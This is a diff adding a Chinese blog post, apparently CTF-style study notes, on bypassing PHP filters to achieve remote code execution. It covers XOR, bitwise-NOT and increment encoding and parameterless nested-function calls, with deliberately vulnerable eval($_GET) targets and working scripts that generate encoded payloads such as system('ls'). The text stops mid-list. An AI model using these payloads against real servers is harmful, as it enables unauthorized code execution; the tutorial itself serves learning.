@@ -1,0 +1,252 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Nayst"><meta name="copyright" content="Nayst"><meta name="generator" content="Hexo 6.2.0"><meta name="theme" content="hexo-theme-yun"><title>一些特殊的RCE绕过 | Nayst-Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.3.3/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/images/Doge.svg"><link rel="mask-icon" href="/images/Doge.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"www.nayst.top","root":"/","title":["Nayst","的","小","站"],"version":"1.10.6","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="无字母数字当字母和数字都被过滤时怎样RCE呢？核心代码如下。 &lt;?php 	if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &amp;#123;   	eval($_GET[&#39;shell&#39;]); 	&amp;#125;  利用非字母数字字符，配合运算符得到需要的字符。 异或在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些特殊的RCE绕过">
+<meta property="og:url" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/index.html">
+<meta property="og:site_name" content="Nayst-Blog">
+<meta property="og:description" content="无字母数字当字母和数字都被过滤时怎样RCE呢？核心代码如下。 &lt;?php 	if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &amp;#123;   	eval($_GET[&#39;shell&#39;]); 	&amp;#125;  利用非字母数字字符，配合运算符得到需要的字符。 异或在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806171447231.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806173524099.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806172855556.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806173618635.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220807234815237.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816100328039.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816101740631.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816104755870.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816110002100.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111342400.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111104220.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111833197.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816113030394.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816140209612.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816143824926.png">
+<meta property="og:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816201722199.png">
+<meta property="article:published_time" content="2022-08-06T04:47:08.000Z">
+<meta property="article:modified_time" content="2022-08-16T12:31:52.457Z">
+<meta property="article:author" content="Nayst">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806171447231.png"><script>(function() {
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Nayst"><img width="96" loading="lazy" src="/images/kakashi.png" alt="Nayst"><span class="site-author-status" title="努力做一个对社会有贡献的人">🤣</span></a><div class="site-author-name"><a href="/about/">Nayst</a></div><span class="site-name">Nayst-Blog</span><sub class="site-subtitle">远离舒适圈</sub><div class="site-description">已入江湖，未配良剑</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">20</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">7</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="2495582918" target="_blank" style="color:#007722"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="y1049843745" target="_blank" style="color:#1AAD19"><span class="icon iconify" data-icon="ri:wechat-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/N4YST" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/1579790" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/jizhideyunyoujun" title="微博" target="_blank" style="color:#E6162D"><span class="icon iconify" data-icon="ri:weibo-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=277777144" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="我的老婆们" style="color:pink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97"><span class="toc-number">1.</span> <span class="toc-text">无字母数字</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">1.1.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">1.2.</span> <span class="toc-text">取反</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">1.3.</span> <span class="toc-text">自增</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">无参数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#localeconv"><span class="toc-number">2.1.</span> <span class="toc-text">localeconv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#chr"><span class="toc-number">2.2.</span> <span class="toc-text">chr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypt"><span class="toc-number">2.3.</span> <span class="toc-text">crypt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getcwd"><span class="toc-number">2.4.</span> <span class="toc-text">getcwd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#realpath"><span class="toc-number">2.5.</span> <span class="toc-text">realpath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dirname"><span class="toc-number">2.6.</span> <span class="toc-text">dirname</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Nayst"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Nayst-Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">一些特殊的RCE绕过</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2022-08-06 12:47:08" itemprop="dateCreated datePublished" datetime="2022-08-06T12:47:08+08:00">2022-08-06</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2022-08-16 20:31:52" itemprop="dateModified" datetime="2022-08-16T20:31:52+08:00">2022-08-16</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">4m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">web安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E7%AC%94%E8%AE%B0/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">笔记</span></a><a class="tag-item" href="/tags/php/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">php</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="无字母数字"><a href="#无字母数字" class="headerlink" title="无字母数字"></a>无字母数字</h1><p>当字母和数字都被过滤时怎样RCE呢？核心代码如下。</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  	<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span></span></code></pre>
+
+<p>利用非字母数字字符，配合运算符得到需要的字符。</p>
+<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>在PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为二进制，再对二进制数据进行异或，再转为ASCII，最后转为字符串。</p>
+<p>由此可以构造脚本得到一个字典，然后需要哪个字符的时候就遍历字典。</p>
+<ul>
+<li><p>构造字典</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"output.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$dict</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+<span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[A-Za-z0-9]+/'</span><span class="token punctuation">;</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">// 前16个前面加0</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0"</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10转16</span>
+    <span class="token keyword">else</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 如果被限制了直接跳过这个字符</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 16转ascii</span>
+    <span class="token comment">// 没被限制加%，就变成了url编码</span>
+    <span class="token keyword">else</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span> <span class="token operator">.</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 前16前面加0</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0"</span> <span class="token operator">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">else</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 只要不被限制的</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token comment">// 在前面加%组成url编码</span>
+            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span> <span class="token operator">.</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+            <span class="token comment">// 记录异或得到的内容、由哪两个异或来的</span>
+            <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          	<span class="token comment">//	只要可用字符</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">31</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ascii转10</span>
+                <span class="token variable">$dict</span> <span class="token operator">=</span> <span class="token variable">$dict</span> <span class="token operator">.</span> <span class="token variable">$out</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$a</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" "</span> <span class="token operator">.</span> <span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$dict</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+</li>
+<li><p>遍历字典</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    a <span class="token operator">=</span> <span class="token string">''</span>
+    b <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> word<span class="token punctuation">:</span>
+        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            dic <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> dic <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span><span class="token keyword">break</span>
+            <span class="token keyword">if</span> dic<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">:</span>
+                a <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
+                b <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+                <span class="token keyword">break</span>
+        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    output <span class="token operator">=</span> <span class="token string">"('"</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token string">"'^'"</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">"')"</span>
+    <span class="token keyword">return</span> output
+
+s1 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your function:"</span><span class="token punctuation">)</span>
+s2 <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command:"</span><span class="token punctuation">)</span>
+flag <span class="token operator">=</span> search<span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">+</span> search<span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">";"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></li>
+</ul>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806171447231.png" class="" loading="lazy">
+
+<p>成功执行！</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806173524099.png" class="" loading="lazy">
+
+<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>在PHP中，字符串被取反后还会在eval函数中执行。</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$function</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
+<span class="token variable">$command</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
+
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
+
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806172855556.png" class="" loading="lazy">
+
+<p>成功执行！</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220806173618635.png" class="" loading="lazy">
+
+<h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>利用PHP中的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.increment.php">递增&#x2F;递减运算符</a>，也就是说<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code>，那么理论上只要能构造出任意字母即可执行命令。</p>
+<p>在php中，强制输出数组时，数组将被转换成字符串<code>Array</code>，那么就可以拿到A了。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220807234815237.png" class="" loading="lazy">
+
+<h1 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h1><p>当限制参数的时候如何操作呢？核心代码如下：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>核心思路就是<strong>通过嵌套函数达到读文件或者RCE</strong>的目的，重点就是对PHP原生函数的利用。</p>
+<p><strong>scandir</strong>可以返回指定目录下有哪些文件，scandir(‘.’)就可以看到当前目录下有哪些文件，再利用数组函数选择需要读的文件读取。</p>
+<p>常用的数组函数：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.end.php">end()</a>- 将数组的内部指针指向最后一个单元</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.key.php">key()</a>- 从关联数组中取得键名</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.each.php">each()</a>- 返回数组中当前的键／值对并将数组指针向前移动一步</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.prev.php">prev()</a>- 将数组的内部指针倒回一位</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.reset.php">reset()</a>- 将数组的内部指针指向第一个单元</li>
